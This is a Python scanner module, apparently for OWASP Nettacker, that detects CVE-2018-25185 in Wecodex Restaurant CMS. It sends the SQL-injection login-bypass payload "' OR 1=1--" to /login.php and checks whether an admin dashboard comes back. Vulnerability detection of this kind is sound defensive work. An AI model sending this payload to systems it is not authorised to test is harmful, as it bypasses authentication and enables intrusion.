"""
cve_2018_25185_vuln.py
----------------------
Author: K. Gopika
Description: OWASP Nettacker module to detect CVE-2018-25185
             (SQL Injection in Wecodex Restaurant CMS 1.0)
Version: 1.0

Detection Logic:
- Sends a POST request to /login.php
- Injects a simple SQL payload: "' OR 1=1--"
- Checks for response behavior indicative of SQL injection
- Does NOT perform any destructive actions
"""

import requests
from modules.core import *
from modules import print_good, print_error

# Module metadata for Nettacker
MODULE_NAME = "cve_2018_25185_vuln"
MODULE_DESCRIPTION = "Detects CVE-2018-25185 SQLi in Wecodex Restaurant CMS"
MODULE_AUTHOR = "K. Gopika"
MODULE_VERSION = "1.0"

def scan(target_ip, target_port):
    """
    Main scan function for the module
    """
    url = f"http://{target_ip}:{target_port}/login.php"
    payload = {"username": "' OR 1=1--", "password": "password"}
    
    try:
        response = requests.post(url, data=payload, timeout=5)
        
        # Check for conditions indicating SQLi
        if "Welcome admin dashboard" in response.text and response.status_code == 200:
            print_good(f"[+] {target_ip}:{target_port} is vulnerable (CVE-2018-25185)")
            return {"target": target_ip, "port": target_port, "status": "Detected"}
        else:
            print_error(f"[-] {target_ip}:{target_port} appears safe")
            return {"target": target_ip, "port": target_port, "status": "Not Detected"}

    except requests.exceptions.RequestException as e:
        print_error(f"[!] Error connecting to {url}: {e}")
        return {"target": target_ip, "port": target_port, "status": "Error"}

# Entry point for manual testing
if __name__ == "__main__":
    target_ip = input("Enter target IP: ")
    target_port = input("Enter target port: ")
    scan(target_ip, target_port)
